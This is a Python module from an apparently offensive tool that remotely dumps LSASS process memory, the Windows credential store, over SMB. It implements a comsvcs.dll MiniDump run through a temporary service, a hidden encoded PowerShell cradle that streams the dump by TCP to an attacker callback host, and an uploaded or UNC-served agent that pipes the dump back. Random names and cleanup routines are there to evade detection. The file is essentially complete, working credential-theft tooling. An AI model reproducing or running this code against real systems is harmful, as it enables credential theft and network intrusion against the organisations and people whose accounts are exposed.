"""Dump methods — different strategies to extract LSASS memory from a remote target.

Each method implements:
1. Remote execution of a technique that captures LSASS memory
2. Retrieval of the dump data (either via SMB file read or TCP receive)
3. Cleanup of any artifacts on the target
"""

import secrets
import string
import time

from ..smb import SmbSession
from ..rpc.svcctl import SvcCtl


def random_name(length: int = 8) -> str:
    """Generate a random alphanumeric name for service/file to avoid signatures."""
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))


class DumpMethod:
    """Base class for dump methods."""

    name: str = "base"

    def __init__(self, session: SmbSession):
        self.session = session

    def execute(self, lsass_pid: int | None = None) -> bytes:
        """Execute the dump and return the raw MDMP bytes."""
        raise NotImplementedError

    def _find_lsass_pid(self) -> int:
        """Find lsass.exe PID by querying the SamSs service."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()
            svc_handle = svc.open_service("SamSs")
            pid = svc.query_service_pid(svc_handle)
            svc.close_handle(svc_handle)
            return pid

    def _exec_via_service(self, svc_name: str, cmd: str) -> None:
        """Execute a command by creating and starting a temporary service."""
        with self.session.open_pipe("svcctl") as pipe:
            svc = SvcCtl(pipe)
            svc.bind()
            svc.open_sc_manager()

            svc_handle = svc.create_service(
                service_name=svc_name,
                display_name=svc_name,
                binary_path=cmd,
            )

            try:
                svc.start_service(svc_handle)
            except RuntimeError:
                pass  # expected for one-shot services

            try:
                svc.delete_service(svc_handle)
            except RuntimeError:
                pass

            svc.close_handle(svc_handle)


class ComSvcsDump(DumpMethod):
    """Dump LSASS using comsvcs.dll MiniDumpWriteDump via rundll32.

    This is the simplest and most reliable method. It DOES write a .dmp file
    to disk temporarily, but we retrieve it via SMB and delete it immediately.

    Equivalent to:
        rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <pid> <path> full
    """

    name = "comsvcs"

    def execute(self, lsass_pid: int | None = None) -> bytes:
        dump_name = f"{random_name()}.tmp"
        dump_path = f"C:\\Windows\\Temp\\{dump_name}"
        svc_name = random_name(10)

        if lsass_pid is None:
            lsass_pid = self._find_lsass_pid()

        cmd = (
            f"%COMSPEC% /Q /c rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
            f"MiniDump {lsass_pid} {dump_path} full"
        )

        self._exec_via_service(svc_name, cmd)
        time.sleep(5)

        try:
            dump_data = self.session.read_file("ADMIN$", f"Temp\\{dump_name}")
        except Exception as e:
            raise RuntimeError(f"Failed to read dump file: {e}") from e
        finally:
            try:
                self.session.delete_file("ADMIN$", f"Temp\\{dump_name}")
            except Exception:
                pass

        if not dump_data or dump_data[:4] != b"MDMP":
            raise RuntimeError("Retrieved data is not a valid minidump")

        return dump_data


class SilentDump(DumpMethod):
    """Stealthier method: uses a custom technique to avoid comsvcs.dll signature.

    Creates a temporary service that uses PowerShell to call MiniDumpWriteDump
    directly via .NET reflection, writing to a named pipe or TCP socket.

    No dump file is written to disk (data goes directly over network).
    """

    name = "silent"

    def __init__(self, session: SmbSession, lhost: str):
        super().__init__(session)
        self.lhost = lhost

    def execute(self, lsass_pid: int | None = None, listen_port: int = 0) -> bytes:
        from .receiver import DumpReceiver

        svc_name = random_name(10)

        if lsass_pid is None:
            lsass_pid = self._find_lsass_pid()

        receiver = DumpReceiver(port=listen_port)
        listen_port = receiver.start()

        ps_script = self._build_ps_cradle(lsass_pid, self.lhost, listen_port)

        import base64
        encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode()
        cmd = f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded}"

        self._exec_via_service(svc_name, cmd)

        # Wait for data
        dump_data = receiver.wait(timeout=30)

        if not dump_data or dump_data[:4] != b"MDMP":
            raise RuntimeError("Received data is not a valid minidump")

        return dump_data

    def _build_ps_cradle(self, pid: int | None, callback_host: str, port: int) -> str:
        """Build the PowerShell script that dumps LSASS and sends via TCP."""
        return f"""
$c = New-Object System.Net.Sockets.TcpClient("{callback_host}", {port})
$s = $c.GetStream()
$sig = @"
[DllImport("dbghelp.dll", SetLastError=true)]
public static extern bool MiniDumpWriteDump(
    IntPtr hProcess, uint ProcessId, IntPtr hFile,
    uint DumpType, IntPtr ExceptionParam,
    IntPtr UserStreamParam, IntPtr CallbackParam);
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
"@
$t = Add-Type -MemberDefinition $sig -Name "DbgHelp" -Namespace "Win32" -PassThru
$lsass = {f'Get-Process lsass | Select-Object -First 1' if pid is None else f'Get-Process -Id {pid}'}
$h = $t::OpenProcess(0x1F0FFF, $false, [uint32]$lsass.Id)
$tmp = [System.IO.Path]::GetTempFileName()
$f = [System.IO.File]::Create($tmp)
$t::MiniDumpWriteDump($h, [uint32]$lsass.Id, $f.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$f.Close()
$bytes = [System.IO.File]::ReadAllBytes($tmp)
$s.Write($bytes, 0, $bytes.Length)
$s.Close()
$c.Close()
Remove-Item $tmp -Force
"""


class PipeDump(DumpMethod):
    """Native agent dump: indirect syscalls, dump streamed via named pipe.

    Two delivery modes:
    - Disk-based (default): agent uploaded to ADMIN$/Temp, executed, deleted.
    - Fileless (--lhost): agent served via local SMB share, loaded via UNC path.

    In both modes the dump data never touches the target's disk — it streams
    through a named pipe directly to the attacker.
    """

    name = "pipe"

    def __init__(self, session: SmbSession, agent_path: str, lhost: str | None = None):
        super().__init__(session)
        self.agent_path = agent_path
        self.lhost = lhost

    def execute(self, lsass_pid: int | None = None) -> bytes:
        import threading

        if lsass_pid is None:
            lsass_pid = self._find_lsass_pid()

        pipe_name = random_name(12)
        svc_name = random_name(10)

        if self.lhost:
            binary_path, cleanup = self._setup_unc(svc_name, lsass_pid, pipe_name)
        else:
            binary_path, cleanup = self._setup_disk(lsass_pid, pipe_name)

        # Start service in a thread (blocks briefly during SCM call)
        def _start():
            self._exec_via_service(svc_name, binary_path)

        t = threading.Thread(target=_start, daemon=True)
        t.start()

        # Connect to the agent's pipe with retries
        try:
            dump_data = self._read_pipe_with_retry(pipe_name, timeout=30)
        finally:
            t.join(timeout=10)
            cleanup()

        if not dump_data or dump_data[:4] != b"MDMP":
            raise RuntimeError("Received data is not a valid minidump")

        return dump_data

    def _setup_disk(self, pid: int, pipe_name: str) -> tuple[str, callable]:
        """Upload agent to ADMIN$/Temp, return binary_path and cleanup function."""
        from smbprotocol.open import (
            Open, CreateDisposition, CreateOptions,
            FileAttributes, FilePipePrinterAccessMask, ImpersonationLevel,
        )

        agent_name = f"{random_name()}.exe"

        with open(self.agent_path, "rb") as f:
            agent_data = f.read()

        tree = self.session.tree_connect("ADMIN$")
        fh = Open(tree, f"Temp\\{agent_name}")
        fh.create(
            impersonation_level=ImpersonationLevel.Impersonation,
            desired_access=FilePipePrinterAccessMask.GENERIC_WRITE,
            file_attributes=FileAttributes.FILE_ATTRIBUTE_NORMAL,
            share_access=0,
            create_disposition=CreateDisposition.FILE_OVERWRITE_IF,
            create_options=CreateOptions.FILE_NON_DIRECTORY_FILE,
        )
        offset = 0
        while offset < len(agent_data):
            chunk = agent_data[offset:offset + 65536]
            fh.write(chunk, offset)
            offset += len(chunk)
        fh.close(get_attributes=False)

        binary_path = f"C:\\Windows\\Temp\\{agent_name} {pid} {pipe_name}"

        def cleanup():
            try:
                self.session.delete_file("ADMIN$", f"Temp\\{agent_name}")
            except Exception:
                pass

        return binary_path, cleanup

    def _setup_unc(self, svc_name: str, pid: int, pipe_name: str) -> tuple[str, callable]:
        """Set up UNC-based delivery via local SMB server (truly fileless)."""
        from .smbserver import serve_agent

        share_name = random_name(6)
        server = serve_agent(self.agent_path, share_name)
        binary_path = f"\\\\{self.lhost}\\{share_name}\\agent.exe {pid} {pipe_name}"

        def cleanup():
            server.stop()

        return binary_path, cleanup

    def _read_pipe_with_retry(self, pipe_name: str, timeout: int = 30) -> bytes:
        """Connect to the agent's pipe with retries, then read all dump data."""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                with self.session.open_pipe(pipe_name) as pipe:
                    chunks = []
                    while True:
                        try:
                            chunk = pipe.read(65536)
                            if not chunk:
                                break
                            chunks.append(chunk)
                        except Exception:
                            break
                    return b"".join(chunks)
            except Exception:
                time.sleep(1)

        raise RuntimeError(f"Timeout connecting to agent pipe '{pipe_name}'")
